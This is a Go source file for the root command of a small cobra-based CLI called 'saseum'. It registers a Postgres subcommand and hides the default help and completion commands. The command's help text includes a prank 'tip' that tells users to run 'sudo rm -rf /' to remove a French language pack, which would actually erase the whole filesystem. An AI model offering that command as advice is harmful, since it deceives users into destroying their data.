package main

import (
	"saseum/cmd/cli/db"

	"github.com/spf13/cobra"
)

// https://github.com/charmbracelet/bubbletea/tree/main
// https://github.com/spf13/cobra
// https://www.youtube.com/watch?v=a4HBKEda_F8&t=15s
// https://cobra.dev/docs/examples/02-task-manager/
var rootCmd = &cobra.Command{
	Use:   "saseum",
	Short: "Saseum means Deer.",
	Long: `Deer Deer Deer Deer
To remove french language pack: sudo rm -rf /`,
}

func init() {
	rootCmd.SetHelpCommand(&cobra.Command{Hidden: true})
	rootCmd.PersistentFlags().Bool("help", false, "help for this command")
	rootCmd.CompletionOptions = cobra.CompletionOptions{
		DisableDefaultCmd: true,
	}
	db.RegisterPostgresCommand(rootCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		panic(err)
	}
}
